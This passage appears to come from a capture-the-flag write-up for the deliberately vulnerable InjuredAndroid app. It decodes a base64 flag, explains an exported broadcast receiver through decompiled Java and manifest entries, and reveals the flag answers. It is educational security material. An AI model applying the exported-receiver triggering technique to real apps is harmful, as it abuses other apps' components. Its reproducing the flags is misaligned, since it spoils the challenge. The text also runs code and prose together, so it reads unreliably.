renamed from: a */    public byte[] m4070a() {        return this.f4499a;    }Public class c1489g, implements base64 decoding of the byte string and returns decoded string to submitFlag class.For decoded string, use base64 linux utility.$ echo \"NF9vdmVyZG9uZV9vbWVsZXRz\" | base64 -d4_overdone_omeletsLevel 4 flag is 4_overdone_omeletsFLAG FIVE - EXPORTED BROADCAST RECEIVERSGoal: Understand how Broadcast receivers workAn application receives broadcasts in two ways:  Through manifest-declared receivers.  Context-registered receivers.Manifest-declared receivers - This causes the system to launch an application when broadcast is received. Searching in AndroidManifest.xml file we get where our broadcast is declared.&lt;receiver android:name=\"b3nac.injuredandroid.FlagFiveReceiver\" android:exported=\"true\"/&gt;&lt;activity android:theme=\"@style/AppTheme.NoActionBar\" android:label=\"@string/title_activity_flag_five\" android:name=\"b3nac.injuredandroid.FlagFiveActivity\"/&gt;In order to understand the Broadcast receivers, analyze oncreate() method in FlagFiveActivity.java file.public void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView(R.layout.activity_flag_five);        m8078C((Toolbar) findViewById(R.id.toolbar));        ((FloatingActionButton) findViewById(R.id.fab)).setOnClickListener(new View.OnClickListener() { // from class: b3nac.injuredandroid.c            @Override // android.view.View.OnClickListener            public final void onClick(View view) {                FlagFiveActivity.this.m4118G(view);            }        });        new ComponentName(this, FlagFiveReceiver.class);        getPackageManager();        C0310a.m8404b(this).m8403c(this.f4409x, new IntentFilter(\"com.b3nac.injuredandroid.intent.action.CUSTOM_INTENT\"));        ((Button) findViewById(R.id.button9)).setOnClickListener(new View.OnClickListener() { // from class: b3nac.injuredandroid.b            @Override // android.view.View.OnClickListener            public final void onClick(View view) {                FlagFiveActivity.this.m4117H(view);   // invokes the intent            }        });    }From the above code, clicking flag2 button, we invoke intent which is defined in m4117H class.An intent is used to perform an action on the screen. Therefore clicking the button element in our application we are invoking an new intent. Intents are used for sending a broadcast receiver. /* renamed from: H */    public /* synthetic */ void m4117H(View view) {        m4119F();    }public void m4119F() {        sendBroadcast(new Intent(\"com.b3nac.injuredandroid.intent.action.CUSTOM_INTENT\"));    }Analyzing component name FlagFiveReceiver class, when an intent is invoked twice, we get flag. The class implements a conditional if else loop condition for checking the number of intents. When the correct flag is displayed, the intents counter is set to zero( i2 = 0), where i2 variable is intent counter as shown in java code below.public final class FlagFiveReceiver extends BroadcastReceiver {    /* renamed from: a */    private static int f4410a;    @Override // android.content.BroadcastReceiver    public void onReceive(Context context, Intent intent) {        String str;        int i;        C2724g.m881e(context, \"context\");        C2724g.m881e(intent, \"intent\");        ApplicationC1492j.f4506j.m4062a(context);        int i2 = f4410a;        if (i2 == 0) {            StringBuilder sb = new StringBuilder();            sb.append(C2765h.m809e(\"\\n    Action: \" + intent.getAction() + \"\\n\\n    \"));            sb.append(C2765h.m809e(\"\\n    URI: \" + intent.toUri(1) + \"\\n\\n    \"));            str = sb.toString();            C2724g.m882d(str, \"sb.toString()\");            Log.d(\"DUDE!:\", str);        } else {            str = \"Keep trying!\";            if (i2 != 1) {                if (i2 == 2) { //Number of times to invoke out intents                    new FlagsOverview().m4087H(true);                    new ApplicationC1492j().m4065b(context, \"flagFiveButtonColor\", true);                    Toast.makeText(context, \"You are a winner \" + C1494k.m4061a(\"Zkdlt0WwtLQ=\"), 1).show();                    i = 0;                    f4410a = i;                }                Toast.makeText(context, str, 1).show();                return;            }        }        Toast.makeText(context, str, 1).show();        i = f4410a + 1;        f4410a = i;    }}onReceive method is responsible for receiving intents sent. Invoking our Activity two times we get a flag.The flag for challenge five is F1v3!"
  }
  
]

